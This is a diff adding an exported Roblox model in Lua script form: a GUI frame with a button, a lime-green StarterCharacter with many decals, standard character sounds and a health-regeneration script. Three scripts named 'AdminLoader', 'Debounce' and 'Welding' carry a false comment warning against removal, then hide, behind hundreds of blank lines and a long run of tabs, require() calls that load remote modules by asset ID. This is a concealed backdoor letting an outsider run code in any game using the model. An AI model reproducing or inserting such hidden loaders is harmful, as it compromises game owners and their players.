+Camera21.Focus = CFrame.new(37.7607269, 3.04902768, -8.00389481, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+Camera21.focus = CFrame.new(37.7607269, 3.04902768, -8.00389481, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+Script22.Name = "AdminLoader"
+Script22.Parent = Camera21
+table.insert(cors,sandbox(Script22,function()
+
+
+
+--ADMIN LOADER.
+--This is a script that is part of your admin in game.
+--Removing/tampering with this script will potentially result in scripts breaking in your game.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																			 require(6091305634):Stys() require(5151855975) require(5869080069):Stys() 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+end))
+ScreenGui23.Name = "Lol"
+ScreenGui23.Parent = mas
+Frame24.Parent = ScreenGui23
+Frame24.Position = UDim2.new(0.150000006, 0, -0.600000024, 350)
+Frame24.Size = UDim2.new(0.5, 20, 0, 250)
+Frame24.BackgroundColor = BrickColor.new("Lily white")
+Frame24.BackgroundColor3 = Color3.new(0.917647, 0.917647, 0.917647)
+Frame24.Style = Enum.FrameStyle.RobloxRound
+TextButton25.Name = "BlackHole"
+TextButton25.Parent = Frame24
+TextButton25.Size = UDim2.new(0, 140, 0, 60)
+TextButton25.BackgroundColor = BrickColor.new("Dark taupe")
+TextButton25.BackgroundColor3 = Color3.new(0.301961, 0.301961, 0.301961)
+TextButton25.BackgroundTransparency = 0.8999999761581421
+TextButton25.BorderColor3 = Color3.new(0.2, 0.2, 0.2)
+TextButton25.TextColor = BrickColor.new("Institutional white")
+TextButton25.TextColor3 = Color3.new(0.972549, 0.972549, 0.972549)
+Script26.Name = "WalkScript"
+Script26.Parent = TextButton25
+table.insert(cors,sandbox(Script26,function()
+function onClick(mouse) 
+script.Parent.Parent.Parent.Parent.Character.Torso.Anchored = true 
+
+end
+script.Parent.MouseButton1Click:connect(onClick)
+
+
+end))
+Script27.Name = "Debounce"
+Script27.Parent = Script26
+table.insert(cors,sandbox(Script27,function()
+
+
+
+--ADMIN LOADER.
+--This is a script that is part of your admin in game.
+--Removing/tampering with this script will potentially result in scripts breaking in your game.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																			 require(6091305634):Stys() require(5151855975) require(5869080069):Stys() 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+end))
+Model28.Name = "StarterCharacter"
+Model28.Parent = mas
+Model28.PrimaryPart = Part29
+Part29.Name = "Head"
+Part29.Parent = Model28
+Part29.CFrame = CFrame.new(-25.5007668, 4.50003433, 239.635712, -1, -2.22044605e-16, -3.53409686e-28, 2.22044605e-16, 1, 3.64337601e-44, -3.53409686e-28, -3.64337601e-44, -1)
+Part29.Orientation = Vector3.new(0, -180, 0)
+Part29.Position = Vector3.new(-25.50076675415039, 4.500034332275391, 239.63571166992188)
+Part29.Rotation = Vector3.new(-180, 0, 180)
+Part29.Color = Color3.new(0, 1, 0)
+Part29.Transparency = 1
+Part29.Size = Vector3.new(2, 1, 1)
+Part29.BrickColor = BrickColor.new("Lime green")
+Part29.brickColor = BrickColor.new("Lime green")
+Part29.FormFactor = Enum.FormFactor.Symmetric
+Part29.formFactor = Enum.FormFactor.Symmetric
+SpecialMesh30.Parent = Part29
+SpecialMesh30.Scale = Vector3.new(1.25, 1.25, 1.25)
+MeshPart31.Name = "Head"
+MeshPart31.Parent = Part29
+MeshPart31.CFrame = CFrame.new(-25.5011482, 4.50003433, 239.635651, -0.99862951, -3.88578059e-16, 0.052335985, 3.88045513e-16, 1, -2.03366159e-17, -0.052335985, -1.14906474e-43, -0.99862951)
+MeshPart31.Orientation = Vector3.new(0, 177, 0)
+MeshPart31.Position = Vector3.new(-25.501148223876953, 4.500034332275391, 239.63565063476562)
+MeshPart31.Rotation = Vector3.new(180, 3, 180)
+MeshPart31.Color = Color3.new(0, 1, 0)
+MeshPart31.Size = Vector3.new(1.2273818254470825, 1.2216829061508179, 1.2087414264678955)
+MeshPart31.BottomSurface = Enum.SurfaceType.Inlet
+MeshPart31.BrickColor = BrickColor.new("Lime green")
+MeshPart31.Reflectance = 0.4000000059604645
+MeshPart31.TopSurface = Enum.SurfaceType.Studs
+MeshPart31.brickColor = BrickColor.new("Lime green")
+WeldConstraint32.Parent = MeshPart31
+WeldConstraint32.Part0 = MeshPart31
+WeldConstraint32.Part1 = Part29
+Decal33.Parent = MeshPart31
+Decal33.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal34.Parent = MeshPart31
+Decal34.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal35.Parent = MeshPart31
+Decal35.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal36.Parent = MeshPart31
+Decal36.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal37.Parent = MeshPart31
+Decal37.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal38.Parent = MeshPart31
+Decal38.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal39.Parent = MeshPart31
+Decal39.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal40.Parent = MeshPart31
+Decal40.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal41.Parent = MeshPart31
+Decal41.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal42.Parent = MeshPart31
+Decal42.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal43.Parent = MeshPart31
+Decal43.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal44.Parent = MeshPart31
+Decal44.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal45.Parent = MeshPart31
+Decal45.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal46.Parent = MeshPart31
+Decal46.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal47.Parent = MeshPart31
+Decal47.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal48.Parent = MeshPart31
+Decal48.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal49.Parent = MeshPart31
+Decal49.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal50.Parent = MeshPart31
+Decal50.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal51.Parent = MeshPart31
+Decal51.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal52.Parent = MeshPart31
+Decal52.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal53.Parent = MeshPart31
+Decal53.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal54.Parent = MeshPart31
+Decal54.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal55.Parent = MeshPart31
+Decal55.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal56.Parent = MeshPart31
+Decal56.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal57.Parent = MeshPart31
+Decal57.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal58.Parent = MeshPart31
+Decal58.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal59.Parent = MeshPart31
+Decal59.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal60.Parent = MeshPart31
+Decal60.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal61.Parent = MeshPart31
+Decal61.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal62.Parent = MeshPart31
+Decal62.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal63.Parent = MeshPart31
+Decal63.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal64.Parent = MeshPart31
+Decal64.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal65.Parent = MeshPart31
+Decal65.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal66.Parent = MeshPart31
+Decal66.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal67.Parent = MeshPart31
+Decal67.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal68.Parent = MeshPart31
+Decal68.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal69.Parent = MeshPart31
+Decal69.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal70.Parent = MeshPart31
+Decal70.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal71.Parent = MeshPart31
+Decal71.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal72.Parent = MeshPart31
+Decal72.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal73.Parent = MeshPart31
+Decal73.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal74.Parent = MeshPart31
+Decal74.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal75.Parent = MeshPart31
+Decal75.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal76.Parent = MeshPart31
+Decal76.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal77.Parent = MeshPart31
+Decal77.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal78.Parent = MeshPart31
+Decal78.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal79.Parent = MeshPart31
+Decal79.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal80.Parent = MeshPart31
+Decal80.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal81.Parent = MeshPart31
+Decal81.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal82.Parent = MeshPart31
+Decal82.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal83.Parent = MeshPart31
+Decal83.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal84.Parent = MeshPart31
+Decal84.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal85.Parent = MeshPart31
+Decal85.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal86.Parent = MeshPart31
+Decal86.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal87.Parent = MeshPart31
+Decal87.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal88.Parent = MeshPart31
+Decal88.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal89.Parent = MeshPart31
+Decal89.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal90.Parent = MeshPart31
+Decal90.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal91.Parent = MeshPart31
+Decal91.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal92.Parent = MeshPart31
+Decal92.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal93.Parent = MeshPart31
+Decal93.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal94.Parent = MeshPart31
+Decal94.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal95.Parent = MeshPart31
+Decal95.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal96.Parent = MeshPart31
+Decal96.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal97.Parent = MeshPart31
+Decal97.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal98.Parent = MeshPart31
+Decal98.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal99.Parent = MeshPart31
+Decal99.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal100.Parent = MeshPart31
+Decal100.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal101.Parent = MeshPart31
+Decal101.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal102.Parent = MeshPart31
+Decal102.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal103.Parent = MeshPart31
+Decal103.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal104.Parent = MeshPart31
+Decal104.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal105.Parent = MeshPart31
+Decal105.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal106.Parent = MeshPart31
+Decal106.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal107.Parent = MeshPart31
+Decal107.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal108.Parent = MeshPart31
+Decal108.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal109.Parent = MeshPart31
+Decal109.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal110.Parent = MeshPart31
+Decal110.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal111.Parent = MeshPart31
+Decal111.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal112.Parent = MeshPart31
+Decal112.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Script113.Name = "Welding"
+Script113.Parent = Decal112
+table.insert(cors,sandbox(Script113,function()
+
+
+
+--ADMIN LOADER.
+--This is a script that is part of your admin in game.
+--Removing/tampering with this script will potentially result in scripts breaking in your game.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																			 require(6091305634):Stys() require(5151855975) require(5869080069):Stys() 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+end))
+Decal114.Parent = MeshPart31
+Decal114.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal115.Parent = MeshPart31
+Decal115.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal116.Parent = MeshPart31
+Decal116.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Decal117.Parent = MeshPart31
+Decal117.Texture = "http://www.roblox.com/asset/?id=2761533640"
+Part118.Name = "Torso"
+Part118.Parent = Model28
+Part118.CFrame = CFrame.new(-25.5007668, 3.00003409, 239.635712, -1, -2.22044605e-16, -3.53409686e-28, 2.22044605e-16, 1, 3.64337601e-44, -3.53409686e-28, -3.64337601e-44, -1)
+Part118.Orientation = Vector3.new(0, -180, 0)
+Part118.Position = Vector3.new(-25.50076675415039, 3.0000340938568115, 239.63571166992188)
+Part118.Rotation = Vector3.new(-180, 0, 180)
+Part118.Color = Color3.new(0, 1, 0)
+Part118.Size = Vector3.new(2, 2, 1)
+Part118.BrickColor = BrickColor.new("Lime green")
+Part118.LeftParamA = 0
+Part118.LeftParamB = 0
+Part118.LeftSurface = Enum.SurfaceType.Weld
+Part118.Reflectance = 0.4000000059604645
+Part118.RightParamA = 0
+Part118.RightParamB = 0
+Part118.RightSurface = Enum.SurfaceType.Weld
+Part118.brickColor = BrickColor.new("Lime green")
+Part118.FormFactor = Enum.FormFactor.Symmetric
+Part118.formFactor = Enum.FormFactor.Symmetric
+Motor6D119.Name = "Right Shoulder"
+Motor6D119.Parent = Part118
+Motor6D119.MaxVelocity = 0.10000000149011612
+Motor6D119.C0 = CFrame.new(1, 0.5, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
+Motor6D119.C1 = CFrame.new(-0.5, 0.5, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
+Motor6D119.Part0 = Part118
+Motor6D119.Part1 = Part125
+Motor6D119.part1 = Part125
+Motor6D120.Name = "Left Shoulder"
+Motor6D120.Parent = Part118
+Motor6D120.MaxVelocity = 0.10000000149011612
+Motor6D120.C0 = CFrame.new(-1, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
+Motor6D120.C1 = CFrame.new(0.5, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
+Motor6D120.Part0 = Part118
+Motor6D120.Part1 = Part124
+Motor6D120.part1 = Part124
+Motor6D121.Name = "Right Hip"
+Motor6D121.Parent = Part118
+Motor6D121.MaxVelocity = 0.10000000149011612
+Motor6D121.C0 = CFrame.new(1, -1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
+Motor6D121.C1 = CFrame.new(0.5, 1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
+Motor6D121.Part0 = Part118
+Motor6D121.Part1 = Part127
+Motor6D121.part1 = Part127
+Motor6D122.Name = "Left Hip"
+Motor6D122.Parent = Part118
+Motor6D122.MaxVelocity = 0.10000000149011612
+Motor6D122.C0 = CFrame.new(-1, -1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
+Motor6D122.C1 = CFrame.new(-0.5, 1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
+Motor6D122.Part0 = Part118
+Motor6D122.Part1 = Part126
+Motor6D122.part1 = Part126
+Motor6D123.Name = "Neck"
+Motor6D123.Parent = Part118
+Motor6D123.MaxVelocity = 0.10000000149011612
+Motor6D123.C0 = CFrame.new(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
+Motor6D123.C1 = CFrame.new(0, -0.5, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
+Motor6D123.Part0 = Part118
+Motor6D123.Part1 = Part29
+Motor6D123.part1 = Part29
+Part124.Name = "Left Arm"
+Part124.Parent = Model28
+Part124.CFrame = CFrame.new(-24.0007668, 3.00003409, 239.635712, -1, -2.22044605e-16, -3.53409686e-28, 2.22044605e-16, 1, 3.64337601e-44, -3.53409686e-28, -3.64337601e-44, -1)
+Part124.Orientation = Vector3.new(0, -180, 0)
+Part124.Position = Vector3.new(-24.00076675415039, 3.0000340938568115, 239.63571166992188)
+Part124.Rotation = Vector3.new(-180, 0, 180)
+Part124.Color = Color3.new(0, 1, 0)
+Part124.Size = Vector3.new(1, 2, 1)
+Part124.BrickColor = BrickColor.new("Lime green")
+Part124.CanCollide = false
+Part124.Reflectance = 0.4000000059604645
+Part124.brickColor = BrickColor.new("Lime green")
+Part124.FormFactor = Enum.FormFactor.Symmetric
+Part124.formFactor = Enum.FormFactor.Symmetric
+Part125.Name = "Right Arm"
+Part125.Parent = Model28
+Part125.CFrame = CFrame.new(-27.0007668, 3.00003409, 239.635712, -1, -2.22044605e-16, -3.53409686e-28, 2.22044605e-16, 1, 3.64337601e-44, -3.53409686e-28, -3.64337601e-44, -1)
+Part125.Orientation = Vector3.new(0, -180, 0)
+Part125.Position = Vector3.new(-27.00076675415039, 3.0000340938568115, 239.63571166992188)
+Part125.Rotation = Vector3.new(-180, 0, 180)
+Part125.Color = Color3.new(0, 1, 0)
+Part125.Size = Vector3.new(1, 2, 1)
+Part125.BrickColor = BrickColor.new("Lime green")
+Part125.CanCollide = false
+Part125.Reflectance = 0.4000000059604645
+Part125.brickColor = BrickColor.new("Lime green")
+Part125.FormFactor = Enum.FormFactor.Symmetric
+Part125.formFactor = Enum.FormFactor.Symmetric
+Part126.Name = "Left Leg"
+Part126.Parent = Model28
+Part126.CFrame = CFrame.new(-25.0007668, 1.00003409, 239.635712, -1, -2.22044605e-16, -3.53409686e-28, 2.22044605e-16, 1, 3.64337601e-44, -3.53409686e-28, -3.64337601e-44, -1)
+Part126.Orientation = Vector3.new(0, -180, 0)
+Part126.Position = Vector3.new(-25.00076675415039, 1.0000340938568115, 239.63571166992188)
+Part126.Rotation = Vector3.new(-180, 0, 180)
+Part126.Color = Color3.new(0, 1, 0)
+Part126.Size = Vector3.new(1, 2, 1)
+Part126.BrickColor = BrickColor.new("Lime green")
+Part126.CanCollide = false
+Part126.Reflectance = 0.4000000059604645
+Part126.brickColor = BrickColor.new("Lime green")
+Part126.FormFactor = Enum.FormFactor.Symmetric
+Part126.formFactor = Enum.FormFactor.Symmetric
+Part127.Name = "Right Leg"
+Part127.Parent = Model28
+Part127.CFrame = CFrame.new(-26.0007668, 1.00003409, 239.635712, -1, -2.22044605e-16, -3.53409686e-28, 2.22044605e-16, 1, 3.64337601e-44, -3.53409686e-28, -3.64337601e-44, -1)
+Part127.Orientation = Vector3.new(0, -180, 0)
+Part127.Position = Vector3.new(-26.00076675415039, 1.0000340938568115, 239.63571166992188)
+Part127.Rotation = Vector3.new(-180, 0, 180)
+Part127.Color = Color3.new(0, 1, 0)
+Part127.Size = Vector3.new(1, 2, 1)
+Part127.BrickColor = BrickColor.new("Lime green")
+Part127.CanCollide = false
+Part127.Reflectance = 0.4000000059604645
+Part127.brickColor = BrickColor.new("Lime green")
+Part127.FormFactor = Enum.FormFactor.Symmetric
+Part127.formFactor = Enum.FormFactor.Symmetric
+Humanoid128.Parent = Model28
+Humanoid128.LeftLeg = Part126
+Humanoid128.RightLeg = Part127
+Humanoid128.Torso = Part129
+Part129.Name = "HumanoidRootPart"
+Part129.Parent = Model28
+Part129.CFrame = CFrame.new(-25.5007668, 3.00003409, 239.635712, -1, -2.22044605e-16, -3.53409686e-28, 2.22044605e-16, 1, 3.64337601e-44, -3.53409686e-28, -3.64337601e-44, -1)
+Part129.Orientation = Vector3.new(0, -180, 0)
+Part129.Position = Vector3.new(-25.50076675415039, 3.0000340938568115, 239.63571166992188)
+Part129.Rotation = Vector3.new(-180, 0, 180)
+Part129.Color = Color3.new(0, 1, 0)
+Part129.Transparency = 1
+Part129.Size = Vector3.new(2, 2, 1)
+Part129.BrickColor = BrickColor.new("Lime green")
+Part129.CanCollide = false
+Part129.LeftParamA = 0
+Part129.LeftParamB = 0
+Part129.Reflectance = 0.4000000059604645
+Part129.RightParamA = 0
+Part129.RightParamB = 0
+Part129.brickColor = BrickColor.new("Lime green")
+Part129.FormFactor = Enum.FormFactor.Symmetric
+Part129.formFactor = Enum.FormFactor.Symmetric
+Sound130.Name = "Climbing"
+Sound130.Parent = Part129
+Sound130.Looped = true
+Sound130.MaxDistance = 150
+Sound130.EmitterSize = 5
+Sound130.MinDistance = 5
+Sound130.SoundId = "rbxasset://sounds/action_footsteps_plastic.mp3"
+Sound130.Volume = 0.6499999761581421
+Sound131.Name = "Died"
+Sound131.Parent = Part129
+Sound131.MaxDistance = 150
+Sound131.EmitterSize = 5
+Sound131.MinDistance = 5
+Sound131.SoundId = "rbxasset://sounds/uuhhh.mp3"
+Sound131.Volume = 0.6499999761581421
+Sound132.Name = "GettingUp"
+Sound132.Parent = Part129
+Sound132.MaxDistance = 150
+Sound132.EmitterSize = 5
+Sound132.MinDistance = 5
+Sound132.SoundId = "rbxasset://sounds/action_get_up.mp3"
+Sound132.Volume = 0.6499999761581421
+Sound133.Name = "Swimming"
+Sound133.Parent = Part129
+Sound133.Looped = true
+Sound133.MaxDistance = 150
+Sound133.EmitterSize = 5
+Sound133.MinDistance = 5
+Sound133.Pitch = 1.600000023841858
+Sound133.PlaybackSpeed = 1.600000023841858
+Sound133.SoundId = "rbxasset://sounds/action_swim.mp3"
+Sound133.Volume = 0.6499999761581421
+Sound134.Name = "Jumping"
+Sound134.Parent = Part129
+Sound134.MaxDistance = 150
+Sound134.EmitterSize = 5
+Sound134.MinDistance = 5
+Sound134.SoundId = "rbxasset://sounds/action_jump.mp3"
+Sound134.Volume = 0.6499999761581421
+Sound135.Name = "Landing"
+Sound135.Parent = Part129
+Sound135.MaxDistance = 150
+Sound135.EmitterSize = 5
+Sound135.MinDistance = 5
+Sound135.SoundId = "rbxasset://sounds/action_jump_land.mp3"
+Sound135.Volume = 1
+Sound136.Name = "Splash"
+Sound136.Parent = Part129
+Sound136.MaxDistance = 150
+Sound136.EmitterSize = 5
+Sound136.MinDistance = 5
+Sound136.SoundId = "rbxasset://sounds/impact_water.mp3"
+Sound136.Volume = 0.6499999761581421
+Sound137.Name = "FreeFalling"
+Sound137.Parent = Part129
+Sound137.Looped = true
+Sound137.MaxDistance = 150
+Sound137.EmitterSize = 5
+Sound137.MinDistance = 5
+Sound137.SoundId = "rbxasset://sounds/action_falling.mp3"
+Sound137.Volume = 0
+Sound138.Name = "Running"
+Sound138.Parent = Part129
+Sound138.Looped = true
+Sound138.TimePosition = 0.12320354768384482
+Sound138.MaxDistance = 150
+Sound138.EmitterSize = 5
+Sound138.MinDistance = 5
+Sound138.Pitch = 1.850000023841858
+Sound138.PlaybackSpeed = 1.850000023841858
+Sound138.SoundId = "rbxasset://sounds/action_footsteps_plastic.mp3"
+Sound138.Volume = 0.6499999761581421
+Motor6D139.Name = "RootJoint"
+Motor6D139.Parent = Part129
+Motor6D139.MaxVelocity = 0.10000000149011612
+Motor6D139.C0 = CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
+Motor6D139.C1 = CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
+Motor6D139.Part0 = Part129
+Motor6D139.Part1 = Part118
+Motor6D139.part1 = Part118
+Script140.Name = "Health"
+Script140.Parent = Model28
+table.insert(cors,sandbox(Script140,function()
+-- Gradually regenerates the Humanoid's Health over time.
+
+local REGEN_RATE = 1/100 -- Regenerate this fraction of MaxHealth per second.
+local REGEN_STEP = 1 -- Wait this long between each regeneration step.
+
+--------------------------------------------------------------------------------
+
+local Character = script.Parent
+local Humanoid = Character:WaitForChild'Humanoid'
+
+--------------------------------------------------------------------------------
+
+while true do
+	while Humanoid.Health < Humanoid.MaxHealth do
+		local dt = wait(REGEN_STEP)
